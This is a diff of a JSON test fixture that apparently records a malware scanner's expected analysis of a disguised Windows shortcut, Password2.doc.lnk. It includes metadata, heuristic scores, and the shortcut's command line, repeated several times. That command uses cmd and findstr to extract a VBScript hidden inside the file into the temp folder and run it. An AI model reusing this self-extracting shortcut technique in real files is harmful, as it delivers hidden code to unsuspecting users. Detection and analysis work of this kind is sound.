@@ -1,35 +1,172 @@
 {
-    "response": {
-        "supplementary": [
-            "20c4b67e22a452e40cd0cff98be0f6bbc164f2d8d2aeb5095535f8f914cd2871"
-        ],
-        "extracted": [
-            {
-                "name": "0650d1da5bd02438c20c49a438d3ed1261bf36cb5ed1cf71b79326c43b78ddf4",
-                "sha256": "0650d1da5bd02438c20c49a438d3ed1261bf36cb5ed1cf71b79326c43b78ddf4"
-            },
-            {
-                "name": "7dea2522c9.bat",
-                "sha256": "7dea2522c9e711903633777c1a80759461c484f049994eedf642a443fbfa832e"
-            }
-        ]
-    },
-    "result": {
-        "heuristics": [
-            1,
-            4,
-            6
-        ],
+  "extra": {
+    "drop_file": false,
+    "score": 950,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [0.8830851987937751, 3.5521550301189357, 1.574472824997899, 1.9843564025757072, 1.6257571130351642, 2.9207539573403514, 3.2232020836844644, 3.3820898634234204, 3.2463399169312597, 3.9576857155071288, 3.137229490402084, 3.403626242900228, 4.435495760110752, 4.843270064350634, 4.071435778360339, 4.510155972425143, 4.265430593415239, 3.7448438969051194, 3.634156882087254, 4.3655039443378225, 5.320299150663647, 5.360559817445699, 5.431826190351651, 5.2451595236849835, 5.26829735693178, 5.368427690322805, 5.0036144850034745, 5.35182619035165, 5.250364317359161, 4.921975110917953, 4.716658767278529, 5.088167023540753, 4.741844777526926, 5.161630690265112, 4.861239690092036, 4.657505738069692, 5.0577214382053866, 4.619908150490571, 4.561174719647027, 4.775913531686176, 4.866444483766211, 5.004946024604939, 4.9390979444532075, 5.024768523511906, 4.572645365048355, 4.382357730613452, 4.888772110975644, 4.8964446800167165, 5.148902444366671, 4.382935312768024]}}",
+        "body_format": "GRAPH_DATA",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "File entropy: 5.716",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"flags\": \"IDList, RelativePath, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Normal\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"cmd.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"command_line_arguments\": \"/v:on /c findstr \\\"rSIPPswjwCtKoZy.*\\\" Password2.doc.lnk > \\\"%tmp%\\\\VEuIqlISMa.vbs\\\" & \\\"%tmp%\\\\VEuIqlISMa.vbs\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
+        "tags": {},
+        "title_text": "Metadata extracted by ExifTool",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_format": "TEXT",
+        "classification": "TLP:W",
+        "depth": 0,
+        "heuristic": null,
         "tags": {
-            "file.shortcut.icon_location": [
-                "shell32.dll"
-            ],
-            "file.shortcut.command_line": [
-                "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\""
-            ],
-            "file.name.extracted": [
+          "file": {
+            "name": {
+              "extracted": [
                 "cmd.exe"
-            ]
+              ]
+            },
+            "shortcut": {
+              "command_line": [
+                "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\""
+              ],
+              "icon_location": [
+                "shell32.dll"
+              ]
+            }
+          }
+        },
+        "title_text": "Extra metadata extracted by LnkParse3",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 250,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious icon used",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\system32\\\\cmd.exe\", \"target_file_dosname\": \"Windows\\\\system32\\\\cmd.exe\"}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 1,
+          "score": 500,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Suspicious command line arguments",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "{\"Length\": 2848}",
+        "body_format": "KEY_VALUE",
+        "classification": "TLP:W",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 6,
+          "score": 200,
+          "score_map": {},
+          "signatures": {}
+        },
+        "tags": {},
+        "title_text": "Additional data after terminal block",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [
+      {
+        "name": "0650d1da5bd02438c20c49a438d3ed1261bf36cb5ed1cf71b79326c43b78ddf4",
+        "sha256": "0650d1da5bd02438c20c49a438d3ed1261bf36cb5ed1cf71b79326c43b78ddf4"
+      },
+      {
+        "name": "fe40585cc7.bat",
+        "sha256": "fe40585cc7abe66a38e195b8cdb53897fa56fbec5b44fdf0c5180e68f5e49044"
+      }
+    ],
+    "supplementary": [
+      {
+        "name": "features.json",
+        "sha256": "20c4b67e22a452e40cd0cff98be0f6bbc164f2d8d2aeb5095535f8f914cd2871"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 1,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      },
+      {
+        "attack_ids": [],
+        "heur_id": 6,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "file.name.extracted": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "cmd.exe"
         }
-    }
+      ],
+      "file.shortcut.command_line": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "..\\..\\Windows\\system32\\cmd.exe /v:on /c findstr \"rSIPPswjwCtKoZy.*\" Password2.doc.lnk > \"%tmp%\\VEuIqlISMa.vbs\" & \"%tmp%\\VEuIqlISMa.vbs\""
+        }
+      ],
+      "file.shortcut.icon_location": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "shell32.dll"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
 }
